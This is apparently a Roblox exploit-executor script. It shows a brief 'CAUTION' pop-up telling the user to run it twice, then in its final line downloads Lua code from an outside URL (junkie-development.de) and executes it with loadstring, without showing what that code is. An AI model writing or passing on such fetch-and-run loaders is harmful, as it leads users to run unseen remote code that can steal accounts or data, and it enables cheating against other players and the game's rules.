
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "ExecutionWarning"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 150)
frame.Position = UDim2.new(0.5, -200, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = gui

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(255, 170, 0)

local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, -20, 1, -20)
text.Position = UDim2.new(0, 10, 0, 10)
text.BackgroundTransparency = 1
text.Text = ":warning: CAUTION :warning:\n\nPlease execute 2 times if it doesnt show up"
text.TextColor3 = Color3.fromRGB(255, 200, 0)
text.TextWrapped = true
text.Font = Enum.Font.GothamBold
text.TextSize = 20
text.Parent = frame


task.delay(4, function()
    gui:Destroy()
end)

loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/e2a14e5075e286bb29a93063129d767a9a7337f5a94cc1ada42c335bef36dba7/download"))()
